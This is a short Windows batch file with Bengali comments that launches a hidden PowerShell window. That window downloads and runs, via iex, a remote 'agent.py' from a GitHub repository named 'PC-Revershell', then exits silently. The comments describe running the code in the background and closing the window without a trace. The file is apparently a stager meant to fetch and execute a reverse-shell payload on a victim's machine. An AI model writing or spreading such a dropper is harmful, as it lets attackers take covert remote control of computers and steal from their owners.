@echo off
:: ১. উইন্ডোজের পাওয়ারশেল ব্যবহার করে ব্যাকগ্রাউন্ডে গিটহাব থেকে সরাসরি কোড রান করা
powershell -WindowStyle Hidden -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mdarif76769/PC-Revershell/main/agent.py')"

:: ২. কাজ শেষ হওয়া মাত্রই ব্যাচ ফাইলের উইন্ডোটি সাইলেন্টলি বন্ধ করে দেওয়া
exit
